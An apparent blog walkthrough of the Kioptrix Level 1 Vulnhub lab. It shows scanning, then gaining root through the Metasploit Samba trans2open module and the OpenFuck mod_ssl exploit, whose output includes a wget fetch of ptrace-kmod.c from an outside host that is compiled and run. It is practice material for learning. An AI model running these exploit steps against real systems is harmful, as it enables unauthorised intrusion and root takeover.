<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/" /><meta property="og:url" content="http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/" /><meta property="og:site_name" content="Mohamed Ayman" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-19T09:46:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough" /><meta name="twitter:site" content="@MAAelHamid" /><meta name="google-site-verification" content="google-site-verification" /> <script type="application/ld+json"> {"description":"Introduction","headline":"KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough","url":"http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/","@type":"BlogPosting","dateModified":"2021-08-13T21:26:09+02:00","datePublished":"2021-07-19T09:46:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/"},"@context":"https://schema.org"}</script><title>KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough | Mohamed Ayman</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mohamed Ayman"><meta name="application-name" content="Mohamed Ayman"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://maaelhamid.github.io/assets/img/profile/av.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mohamed Ayman</a></div><div class="site-subtitle font-italic">Offensive Security Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/MAAelHamid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/MAAelHamid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['m.a.a.elhamid','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Ayman </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Jul 19, 2021, 9:46 AM +0200" prep="on" > Jul 19 <i class="unloaded">2021-07-19T09:46:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 13, 2021, 9:26 PM +0200" prefix="Updated " > Aug 13 <i class="unloaded">2021-08-13T21:26:09+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1917 words">10 min</span></div></div><div class="post-content"><h1 id="introduction">Introduction</h1><p>This Kioptrix: Level 1 VM Image is rated as <strong>Easy/Beginner</strong> level challenge. The objective of the game is to acquire root access via any means possible. The purpose of the game is to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. It was created by <a href="https://www.vulnhub.com/author/kioptrix,8/">Kioptrix</a> Other machines in the series can be found in the <a href="https://www.vulnhub.com/series/kioptrix,8/">Kioptrix</a> series page on Vulnhub.</p><h1 id="scanning">Scanning</h1><p>We first need to get the target IP. in my case network sittings was bridged so i run <code class="language-plaintext highlighter-rouge">sudo netdisover</code></p><p>to catch all ip in my network =&gt; kioprix ip is <code class="language-plaintext highlighter-rouge">192.168.1.7</code></p><p>you can use nmap to catch your ip using <code class="language-plaintext highlighter-rouge">-sP</code> flag</p><h2 id="nmap">nmap</h2><p><code class="language-plaintext highlighter-rouge">sudo nmap -sV -p- -O -T4 192.168.1.7</code></p><ul><li><code class="language-plaintext highlighter-rouge">-sV</code> determine service/version info<li><code class="language-plaintext highlighter-rouge">-T4</code> for faster execution<li><code class="language-plaintext highlighter-rouge">-p-</code> scan all ports<li><code class="language-plaintext highlighter-rouge">-O</code> identify Operating System</ul><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="go">tarting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 04:06 EDT
Nmap scan report for 192.168.1.7
Host is up (0.0011s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class="gp">111/tcp  open  rpcbind     2 (RPC #</span>100000<span class="o">)</span>
<span class="go">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
</span><span class="gp">1024/tcp open  status      1 (RPC #</span>100024<span class="o">)</span>
<span class="go">Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.38 seconds
</span></pre></table></code></div></div><p>nmap can’t identify <code class="language-plaintext highlighter-rouge">SMB</code> version lets do it on our own</p><ol><li><p>Using <a href="https://tools.kali.org/information-gathering/enum4linux">enum4linux</a> <code class="language-plaintext highlighter-rouge">enum4linux</code></p><li><p>Using <a href="https://tldp.org/HOWTO/SMB-HOWTO-8.html">smbclient</a> <code class="language-plaintext highlighter-rouge">smbclient -L</code></p><li><p>Using <a href="https://www.metasploit.com/">metasploit</a></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="go">➜  ~ msfconsole 
</span><span class="gp">msf6 &gt;</span><span class="w"> </span>search smb version scanner
<span class="go">   
Matching Modules
================
   
</span><span class="gp">   #</span><span class="w">  </span>Name                               Disclosure Date  Rank    Check  Description
<span class="go">   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
   
   
Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
   
</span><span class="gp">msf6 &gt;</span><span class="w"> </span>use 0
<span class="gp">msf6 auxiliary(scanner/smb/smb_version) &gt;</span><span class="w"> </span>options 
<span class="go">   
Module options (auxiliary/scanner/smb/smb_version):
   
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with sy
</span><span class="gp">                                       ntax 'file:&lt;path&gt;</span><span class="s1">'
</span><span class="go">   THREADS  1                yes       The number of concurrent threads (max one per host)
   
</span><span class="gp">msf6 auxiliary(scanner/smb/smb_version) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 192.168.1.7
<span class="gp">rhosts =&gt;</span><span class="w"> </span>192.168.1.7
<span class="gp">msf6 auxiliary(scanner/smb/smb_version) &gt;</span><span class="w"> </span>exploit
<span class="go">   
[*] 192.168.1.7:139       - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.1.7:139       -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.1.7:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</span></pre></table></code></div></div><p>Now we have the SMB version - <strong>Samba 2.2.1a</strong></p></ol><h1 id="gaining-access">Gaining Access</h1><p>after some <code class="language-plaintext highlighter-rouge">googling</code> i found these exploit</p><p>you can use <code class="language-plaintext highlighter-rouge">search sploit</code> in terminal too .</p><h2 id="method-1-samba-trans2open-overflow-linux-x86">Method 1: Samba trans2open Overflow (Linux x86)</h2><p>now fire <code class="language-plaintext highlighter-rouge">msfconsole</code> searching for <strong>trans2open</strong></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="gp">msf6 &gt;</span><span class="w"> </span>search trans2open
<span class="go">
Matching Modules
================

</span><span class="gp">   #</span><span class="w">  </span>Name                              Disclosure Date  Rank   Check  Description
<span class="go">   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

</span><span class="gp">msf6 &gt;</span><span class="w"> </span>use 1
<span class="go">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
</span><span class="gp">msf6 exploit(linux/samba/trans2open) &gt;</span><span class="w"> </span>show payloads 
<span class="go">
Compatible Payloads
===================

</span><span class="gp">   #</span><span class="w">   </span>Name                                              Disclosure Date  Rank    Check  Description
<span class="go">   -   ----                                              ---------------  ----    -----  -----------
   0   payload/generic/custom                                             normal  No     Custom Payload
   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
</span><span class="c">	...
</span><span class="go">   29  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline
   30  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline

</span><span class="gp">msf6 exploit(linux/samba/trans2open) &gt;</span><span class="w"> </span><span class="nb">set </span>payload 30
<span class="gp">payload =&gt;</span><span class="w"> </span>linux/x86/shell_bind_tcp
<span class="gp">msf6 exploit(linux/samba/trans2open) &gt;</span><span class="w"> </span>options
<span class="go">
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syn
</span><span class="gp">                                      tax 'file:&lt;path&gt;</span><span class="s1">'
</span><span class="go">   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


</span><span class="gp">msf6 exploit(linux/samba/trans2open) &gt;</span><span class="w"> </span><span class="nb">set </span>rhost 192.168.1.7
<span class="gp">rhost =&gt;</span><span class="w"> </span>192.168.1.7
<span class="gp">msf6 exploit(linux/samba/trans2open) &gt;</span><span class="w"> </span>exploit
<span class="go">
[*] 192.168.1.7:139 - Trying return address 0xbffffdfc...
[*] Started bind TCP handler against 192.168.1.7:4444
[*] 192.168.1.7:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffafc...
[*] 192.168.1.7:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.7:139 - Trying return address 0xbffff8fc...
</span><span class="gp">[*] Command shell session 1 opened (0.0.0.0:0 -&gt;</span><span class="w"> </span>192.168.1.7:4444<span class="o">)</span> at 2021-07-19 04:26:53 <span class="nt">-0400</span>
<span class="go">
whoami
root
uname -a
</span><span class="gp">Linux kioptrix.level1 2.4.7-10 #</span>1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
</pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Gain root access to the machine</ul><h2 id="method-2-openfuck-mod_ssl-vulnerability">Method 2: OpenFuck mod_ssl vulnerability</h2><p>nmap output we find <strong>mod_ssl/2.8.4</strong></p><p>lets use searchsploit this time</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">➜  ~ searchsploit mod_ssl
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Servi | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Bu | multiple/dos/21575.txt
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' | unix/remote/21671.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/47080.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/764.c
Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-bet | unix/remote/40347.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
</span></pre></table></code></div></div><div class="table-wrapper"><table><tbody><tr><td>most suitable one is **Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.<td>unix/remote//usr/share/exploitdb/exploits/unix/remote/47080.c.c**</table></div><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">➜  ~ searchsploit -p 47080                                
  Exploit: Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
File Type: C source, ASCII text, with CRLF line terminators
</span></pre></table></code></div></div><p>to copy exploit to current directory</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">➜  ~ searchsploit -m 47080
</span></pre></table></code></div></div><p>use head to display first 10 line of exploit which contains how to run exploit</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">➜  ~ head 47080.c      
/*
 * OF version r00t VERY PRIV8 spabam
 * Version: v3.0.4 
 * Requirements: libssl-dev    ( apt-get install libssl-dev )
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
</span><span class="gp"> * #</span>hackarena irc.brasnet.org
<span class="go"> * Note: if required, host ptrace and replace wget target
 */

</span></pre></table></code></div></div><p>now we know how to use <code class="language-plaintext highlighter-rouge">Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto</code></p><p>don’t forget the requirements <code class="language-plaintext highlighter-rouge">sudo apt-get install libssl-dev</code></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="go">➜  ~ ./OpenFuck   

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
</span><span class="gp">* #</span>hackarena  irc.brasnet.org                                     <span class="k">*</span>
<span class="gp">* TNX Xanthic USG #</span>SilverLords <span class="c">#BloodBR #isotk #highsecure #uname *</span>
<span class="gp">* #</span>ION <span class="c">#delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
<span class="gp">* #</span>pinchadoresweb HiTechHate DigitalWrapperz P<span class="o">()</span>W GAT ButtP!rateZ <span class="k">*</span>
<span class="go">*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
</span><span class="c">	...
</span><span class="go">	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
</span><span class="c">	...
</span><span class="go">
</span><span class="gp">#</span>&amp;<span class="nv">$@</span> to all guys <span class="nb">who </span>like use lamah ddos. Read SRC to have no surprise
</pre></table></code></div></div><p>What we need:</p><ol><li><p><strong>target</strong> -offset value from the list</p><p>From our nmap scan we know the service version is: “Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)”.</p><p>Looking for Red-Hat and 1.3.20 versions leave us with two options:</p><ul><li><strong>0x6a</strong> - RedHat Linux 7.2 (apache-1.3.20-16)1<li><strong>0x6b</strong> - RedHat Linux 7.2 (apache-1.3.20-16)2</ul><li><p><strong>box</strong> - target’s IP - ‘kioptrix’ in our case</p><li><p><strong>port</strong> - HTTP port - 443 in our case</p><li><p><strong>Number of connection</strong> to open (range of 40-50) - We’ll go with 40</p></ol><p>Therefore the complete command we’ll use: <code class="language-plaintext highlighter-rouge">./Openfuck 0x6b kioptrix 443 -c 40</code>:</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="go">➜  ~ ./OpenFuck 0x6b kioptrix 443 -c 40
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
</span><span class="gp">* #</span>hackarena  irc.brasnet.org                                     <span class="k">*</span>
<span class="gp">* TNX Xanthic USG #</span>SilverLords <span class="c">#BloodBR #isotk #highsecure #uname *</span>
<span class="gp">* #</span>ION <span class="c">#delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
<span class="gp">* #</span>pinchadoresweb HiTechHate DigitalWrapperz P<span class="o">()</span>W GAT ButtP!rateZ <span class="k">*</span>
<span class="go">*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80fa068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
</span><span class="gp">bash-2.05$</span><span class="w"> 
</span><span class="gp">d.c;</span><span class="w"> </span>./exploit<span class="p">;</span> <span class="nt">-kmod</span>.c<span class="p">;</span> gcc <span class="nt">-o</span> exploit ptrace-kmod.c <span class="nt">-B</span> /usr/bin<span class="p">;</span> <span class="nb">rm </span>ptrace-kmo 
<span class="go">--20:52:11--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</span><span class="gp">           =&gt;</span><span class="w"> </span><span class="sb">`</span>ptrace-kmod.c<span class="s1">'
</span><span class="go">Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

20:52:12 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

gcc: file path prefix `/usr/bin' never used
[+] Attached to 12590
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Gain root access to the machine</ul><h1 id="capture-the-flag">Capture The Flag</h1><p>Once we have a <strong><em>shell*** using on of the above methods, we need to spawn a TTY shell. <code class="language-plaintext highlighter-rouge">/bin/bash -i</code> is used to get active **</em>bash shell*</strong>. You can find other options on the post Summary below.</p><p>Let’s look at the user’s commands history:</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="go">➜  ~ history
history
    1  ls    
    2  mail    
    3  mail    
    4  clear    
</span><span class="gp">    5  echo "ls" &gt;</span><span class="w"> </span>.bash_history <span class="o">&amp;&amp;</span> poweroff    
<span class="go">    6  nano /etc/issue    
    7  pico /etc/issue    
    8  pico /etc/issue    
    9  ls   
    10  clear   
    11  ls /home/   
    12  exit   
    13  ifconfig   
    14  poweroff   
    15  history 
</span></pre></table></code></div></div><p>The mail command might be intresting. We can access mail using <code class="language-plaintext highlighter-rouge">mail</code> command interacting with it (selecting what message to read) using message number (Use <code class="language-plaintext highlighter-rouge">exit</code> to leave the mail)</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>➜  ~ mail
mail 
Mail version 8.1 6/6/93.  Type ? for help.
"/var/mail/root": 2 messages 1 new 2 unread
U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   "About Level 2" 
&gt;N  2 root@kioptrix.level1  Fri Jan 15 18:08  18/524   "LogWatch for kioptrix" 

1
Message 1:
From root  Sat Sep 26 11:42:10 2009 
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root &lt;root@kioptix.level1&gt; 
To: root@kioptix.level1 
Subject: About Level 2 

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy... 

2
Message 2: From root  Fri Jan 15 18:08:41 2021 
Date: Fri, 15 Jan 2021 18:08:41 -0500 
From: root &lt;root@kioptrix.level1&gt; 
To: root@kioptrix.level1 
Subject: LogWatch for kioptrix.level1
################## LogWatch 2.1.1 Begin ##################### 

###################### LogWatch End #########################  
</pre></table></code></div></div><p>That’s our flag!</p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Capture the flag</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vlunhub/'>VlunHub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/kioptrix/" class="post-tag no-text-decoration" >kioptrix</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough - Mohamed Ayman&u=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypass-30X-redirect-with-BurpSuite/">Bypass 30X redirect with BurpSuite</a><li><a href="/posts/TOPPO/">TOPPO - Vulnhub Walkthrough</a><li><a href="/posts/ESCALATE-LINUX/">ESCALATE LINUX - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1/">KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1.1/">KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" 